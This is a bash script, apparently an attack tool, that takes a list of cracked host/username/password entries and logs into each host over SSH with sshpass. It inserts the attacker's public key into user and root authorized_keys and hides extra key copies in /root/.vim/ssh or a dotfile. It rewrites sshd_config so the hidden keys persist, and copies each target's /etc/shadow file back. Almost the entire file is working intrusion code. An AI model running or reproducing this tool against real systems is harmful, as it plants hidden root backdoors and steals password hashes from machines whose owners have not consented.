#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## sets up ssh keys and adds new path
	## pulls back /etc/shadow file
	## quickly changes your ip/mac, if needed
#=======================================================================================
#=======================================================================================
	#
	#*************** NEED TO DO/ADD ***********************
	# "clone target" function
	# checks for host/target OS and make changes accordingly
	# fix whatever is fucking the CentOS drop in (forcing you to ctrl-c each one)
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
###### RUN function #######
###########################
function main(){		###
	#neo				###
	#meat				###
	infect "$@"			###
	#mutate				### "RANDOMIZE"
	#mirror				### IMPERSONATE
	#molt				### ORIGINAL CONFIG
}						###
###########################
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
###########################################################################################
# installs keys, changes key path, attempts to take root
###########################################################################################
function infect(){
#### launch bay #########
function payload(){		#
#	razor "$@"			# SINGLE TARGET
	shotgun				# EVERYONE
}						#
#########################
	#### Setting Defaults ############################
	crackedLogins="./crackedLogins"
	sshKey="/root/.ssh/id_rsa"
	#### Gathering Info ############################
	# making key if there isn't one
		if [ ! -e $sshKey ]; then
			ssh-keygen -f $sshKey -t rsa -N ''
		fi
#+++++++++++++++
# single target
#+++++++++++++++
	function razor(){
		#### Assigning Defaults ############################
		target="$1"
		username="$2"
		password="$3"
		#### Inserting keys ############################
		printf "\nInserting ssh key into [$target] with ($username:$password)\n"
		sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" </root/.ssh/id_rsa.pub
	}
#+++++++++++++++
# into a crowd
#+++++++++++++++
	function shotgun(){
		while read -r tango; do
		#### Assigning values ############################
			target="$(echo $tango | cut -d" " -f1)"
			username="$(echo $tango | cut -d" " -f2)"
			password="$(echo $tango | cut -d" " -f3)"

			sshLoginCommand="sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
			sshUserPath="/home/$username/.ssh"
			sshUserKey="$sshUserPath/authorized_keys"
			sshRootPath="/root/.ssh"
			sshRootKey="$sshRootPath/authorized_keys"
			sshPoisonPath="/root/.vim"
			sshPoisonKey="$sshPoisonPath/ssh"
		#### Inserting keys ############################
			jankTastic=$(sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
			if [[ $? == 0 ]]; then
				printf "\nInserting ssh key and poisoning dirs for [$target] with ($username:$password)"
			else
				printf "\nFAILED to connect to $target"
			fi
			printf "\njank result= $jankTastic\n"
			case $jankTastic in
				Ubuntu)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							printf "\nPoisoning sshd rules on [$target]\n"
							ssh $target "
										mkdir $sshPoisonPath
										cp $sshRootKey $sshPoisonKey
										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
										service sshd restart
										" &
						#yanking back the shadow file
							printf "\nYanking shadow file from [$target]"
							ssh $target "
										cat /etc/shadow
										" &> shadow-$target
							;;
				Debian)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							printf "\nPoisoning sshd rules on [$target]\n"
							ssh $target "
										mkdir $sshPoisonPath
										cp $sshRootKey $sshPoisonKey
										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
										service sshd restart
										" &
						#yanking back the shadow file
							printf "\nYanking shadow file from [$target]"
							ssh $target "
										cat /etc/shadow
										" &> shadow-$target
							;;
				CentOS)
						#inserting key
							$sshLoginCommand "
											echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
											echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
																	 cat >> $sshUserKey
											echo $password | sudo -S chmod 600 $sshUserKey &> /dev/null
											echo $password | sudo -S cp $sshUserKey $sshRootKey &> /dev/null
											echo $password | sudo -S restorecon -r /root &> /dev/null
											"</root/.ssh/id_rsa.pub

							# if sudo doesn't exist, sets up the key for normal user and lets you know.
							if [ $? != 0 ]; then
								printf "\n\e[0;31mwomp womp.. no sudo. you get to do it manually.. yay!!\e[0m\n\t[$target:$username:$password]\n"
								$sshLoginCommand "
												mkdir -m700 -p $sshUserPath
												chmod 600 $sshUserKey &> /dev/null || install -m 600 /dev/null $sshUserKey
												cat >> $sshUserKey
												" </root/.ssh/id_rsa.pub
							fi
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							if [ $? == 0 ]; then
								printf "\nPoisoning sshd rules on [$target]\n"
								ssh $target "
											mkdir $sshPoisonPath
											cp $sshRootKey /root/.ssh/.authorized_keys
											echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
											service sshd restart
											" &
							fi
						#yanking back the shadow file
							printf "\nYanking shadow file from [$target]"
							ssh $target "
										cat /etc/shadow
										" &> shadow-$target
							;;
					*)		echo UNKNOWN
							;;
			esac
		done <<< $(sort -u $crackedLogins | sed '/^$/d')
	}
payload "$@"
}
###########################################################################################
# if called; changes ip, mac, etc
###########################################################################################
function mutate(){
	:
	#### PART 1 ############################
}
###########################################################################################
# tries to make us appear as another
###########################################################################################
function mirror(){
	:
	#### PART 1 ############################
}
###########################################################################################
# returns to original form
###########################################################################################
function molt(){
	:
	#### PART 1 ############################
}
###########################################################################################
# makes sure everything we need is installed
###########################################################################################
function meat(){
	commands="macchanger sshpass net-tools"
	installing=""
	updated=0
	scriptPath="$BASH_SOURCE"

	# updating repo list, if needed
		if [[ $updated == 0 ]]; then
			command apt update
		# so it knows not to check again
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	# lookin for missing apps
		for word in $commands; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ "$installing" != "" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi
}
###########################################################################################
# are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main "$@"
